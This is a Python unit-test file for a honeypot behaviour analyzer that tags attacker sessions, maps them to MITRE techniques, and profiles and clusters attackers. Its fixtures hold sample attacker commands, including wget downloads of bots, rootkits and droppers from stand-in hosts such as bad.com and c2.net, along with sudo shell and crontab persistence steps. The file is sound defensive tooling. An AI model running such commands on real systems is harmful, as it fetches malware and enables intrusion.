"""
Unit tests for BehaviorAnalyzer and TTP clustering.
"""

from __future__ import annotations

import datetime
import pytest

from src.honeypot.behavior import BehaviorAnalyzer
from src.honeypot.models import (
    CommandRecord,
    CredentialAttempt,
    FileArtifact,
    HoneypotSession,
)


@pytest.fixture
def analyzer() -> BehaviorAnalyzer:
    return BehaviorAnalyzer()


def test_analyze_recon_session(analyzer: BehaviorAnalyzer):
    sess = HoneypotSession(source_ip="198.51.100.1")
    sess.commands.append(CommandRecord(command="uname -a", tags=["recon"]))
    sess.commands.append(CommandRecord(command="whoami", tags=["recon"]))
    sess.commands.append(CommandRecord(command="ifconfig", tags=["recon"]))

    analysis = analyzer.analyze_session(sess)
    assert "recon" in analysis["ttp_categories"]
    assert "T1082" in analysis["mitre_techniques"]
    assert analysis["archetype"] == "interactive_recon"
    assert analysis["threat_level"] == "medium"


def test_analyze_dropper_session(analyzer: BehaviorAnalyzer):
    sess = HoneypotSession(source_ip="198.51.100.2")
    sess.commands.append(CommandRecord(command="wget http://bad.com/bot.sh", tags=["download"]))
    sess.artifacts.append(FileArtifact(filename_or_url="bot.sh", file_hash="hash123"))

    analysis = analyzer.analyze_session(sess)
    assert "download" in analysis["ttp_categories"]
    assert "T1105" in analysis["mitre_techniques"]
    assert analysis["archetype"] == "automated_dropper"
    assert analysis["threat_level"] == "high"


def test_analyze_targeted_multistage_session(analyzer: BehaviorAnalyzer):
    sess = HoneypotSession(source_ip="198.51.100.3")
    sess.commands.append(CommandRecord(command="whoami", tags=["recon"]))
    sess.commands.append(CommandRecord(command="wget http://bad.com/rootkit", tags=["download"]))
    sess.commands.append(CommandRecord(command="sudo /bin/bash", tags=["privilege_escalation"]))
    sess.commands.append(CommandRecord(command="crontab -e", tags=["persistence"]))
    sess.artifacts.append(FileArtifact(filename_or_url="rootkit", file_hash="hashrootkit"))

    analysis = analyzer.analyze_session(sess)
    assert "privilege_escalation" in analysis["ttp_categories"]
    assert "persistence" in analysis["ttp_categories"]
    assert analysis["archetype"] == "targeted_multi_stage"
    assert analysis["threat_level"] == "critical"


def test_build_attacker_profile(analyzer: BehaviorAnalyzer):
    now = datetime.datetime.now(datetime.timezone.utc)
    s1 = HoneypotSession(source_ip="203.0.113.77", start_time=now)
    s1.credentials.append(CredentialAttempt(username="root", password="123"))
    s1.commands.append(CommandRecord(command="uname -a", tags=["recon"]))

    s2 = HoneypotSession(source_ip="203.0.113.77", start_time=now + datetime.timedelta(minutes=5))
    s2.commands.append(CommandRecord(command="wget http://c2.net/dropper", tags=["download"]))
    s2.artifacts.append(FileArtifact(filename_or_url="dropper", file_hash="hash456"))

    profile = analyzer.build_attacker_profile("203.0.113.77", [s1, s2])

    assert profile.ip == "203.0.113.77"
    assert profile.session_count == 2
    assert profile.total_commands_executed == 2
    assert profile.total_payloads_attempted == 1
    assert "root" in profile.usernames_targeted
    assert "123" in profile.passwords_targeted
    assert "recon" in profile.ttp_categories
    assert "download" in profile.ttp_categories
    assert profile.threat_level == "high"


def test_cluster_attackers(analyzer: BehaviorAnalyzer):
    # Attacker A: Dropper
    s_a = HoneypotSession(source_ip="1.1.1.1")
    s_a.commands.append(CommandRecord(command="wget http://x.com/a", tags=["download"]))
    s_a.artifacts.append(FileArtifact(filename_or_url="a", file_hash="ha"))

    # Attacker B: Recon
    s_b = HoneypotSession(source_ip="2.2.2.2")
    s_b.commands.extend([
        CommandRecord(command="uname", tags=["recon"]),
        CommandRecord(command="whoami", tags=["recon"]),
        CommandRecord(command="id", tags=["recon"]),
    ])

    clusters = analyzer.cluster_attackers([s_a, s_b])

    droppers = [p.ip for p in clusters["Automated Scanner / Payload Dropper (Mirai/Botnet style)"]]
    recon_ops = [p.ip for p in clusters["Interactive Manual Reconnaissance (Human Operator)"]]

    assert "1.1.1.1" in droppers
    assert "2.2.2.2" in recon_ops


def test_generate_statistics(analyzer: BehaviorAnalyzer):
    s1 = HoneypotSession(source_ip="10.0.0.1")
    s1.credentials.append(CredentialAttempt(username="admin", password="password"))
    s1.commands.append(CommandRecord(command="uname -a", tags=["recon"]))

    s2 = HoneypotSession(source_ip="10.0.0.2")
    s2.credentials.append(CredentialAttempt(username="root", password="password"))
    s2.commands.append(CommandRecord(command="uname -a", tags=["recon"]))

    stats = analyzer.generate_statistics([s1, s2])

    assert stats["total_sessions"] == 2
    assert stats["unique_attackers"] == 2
    assert stats["total_credentials_tried"] == 2
    assert stats["top_passwords"][0] == ("password", 2)
    assert stats["top_commands"][0] == ("uname -a", 2)
